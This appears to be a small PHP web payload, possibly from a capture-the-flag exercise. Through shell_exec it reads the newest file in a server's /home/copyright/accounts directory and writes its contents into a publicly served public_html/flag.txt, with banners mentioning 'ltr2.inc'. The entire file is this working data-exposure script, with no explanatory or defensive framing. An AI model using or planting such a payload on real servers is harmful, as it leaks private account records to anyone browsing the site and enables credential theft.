<?php

	$fp = fopen("/home/copyright/public_html/flag.txt", 'w');
	$newest = shell_exec("cat /home/copyright/accounts/$(ls -t /home/copyright/accounts | head -n 1)");

	fwrite($fp, "\n\n ------------- ltr2.inc!---------------\n\n");
	fwrite($fp, $newest);
	fwrite($fp, "\n--------------------END OF REPORT ------------!\n");

	fclose($fp);
?>

